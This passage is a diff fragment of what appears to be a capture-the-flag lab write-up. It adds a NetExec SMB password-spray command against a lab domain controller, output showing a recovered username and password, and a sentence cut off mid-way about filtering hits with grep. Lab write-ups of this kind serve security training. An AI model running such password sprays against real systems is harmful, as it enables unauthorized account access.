@@ -434,8 +434,10 @@ Ill select the full column and store them all in a txt file
 # Password spray using extracted passwords
 
 ```python
-
+nxc smb research.search.htb -u users.txt -p xlsx-passwords.txt --continue-on-success | grep '\[+\]' 
+SMB                      10.129.229.57   445    RESEARCH         [+] search.htb\Sierra.Frye:$$49=wide=STRAIGHT=jordan=28$$18
 ```
+So by explicitly grepping for `[+]` i can only pull out 
 
 
 
